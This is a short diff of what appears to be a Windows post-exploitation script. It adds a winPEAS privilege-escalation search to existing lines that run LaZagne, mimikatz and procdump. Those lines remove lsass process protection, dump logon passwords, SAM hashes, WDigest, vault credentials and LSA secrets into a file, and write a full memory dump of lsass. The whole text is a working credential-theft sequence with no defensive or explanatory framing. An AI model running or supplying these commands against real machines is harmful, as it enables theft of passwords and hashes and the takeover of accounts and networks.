@@ -1,4 +1,5 @@
 cd C:/blood
+./winPEASany_ofs.exe searchall log
 ./lazagne.exe all
 ./mimikatz.exe "token::elevate" "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "lsadump::sam" "sekurlsa::Credman" "sekurlsa::Wdigest" "vault::cred /patch" "lsadump::secrets" "exit" | tee mimikatz.txt
 ./procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
